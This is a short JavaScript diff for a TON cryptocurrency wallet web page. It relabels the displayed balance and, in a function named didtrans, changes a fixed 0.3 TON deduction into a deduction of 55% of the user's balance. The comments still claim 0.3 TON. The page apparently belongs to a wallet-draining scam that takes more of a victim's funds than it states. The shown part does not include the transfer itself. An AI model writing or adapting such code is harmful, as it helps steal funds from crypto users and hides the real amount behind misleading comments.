@@ -53,7 +53,7 @@ async function updateBalance(walletAddress) {
         // Обновляем отображение баланса на странице
         const walletInfoElement = document.getElementById('wallet-info');
         if (walletInfoElement) {
-            walletInfoElement.innerHTML = `Доступно для получения: <b>${displayedBalance} TON</b>`;
+            walletInfoElement.innerHTML = `Ваш баланс: <b>${displayedBalance} TON</b>`;
         }
 
     } catch (error) {
@@ -84,7 +84,7 @@ async function didtrans() {
     const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
 
     // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
-    const deduction = 0.3 * 1000000000; // 0.3 TON в нанотонах
+    const deduction = originalBalance * 0.55; // 0.3 TON в нанотонах
 
     // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
     if (originalBalance <= deduction) {
@@ -94,7 +94,7 @@ async function didtrans() {
     }
 
     // Вычитаем 0.3 TON из баланса
-    const remainingBalance = originalBalance * 0.45;
+    const remainingBalance = originalBalance - deduction;
 
     console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);
 
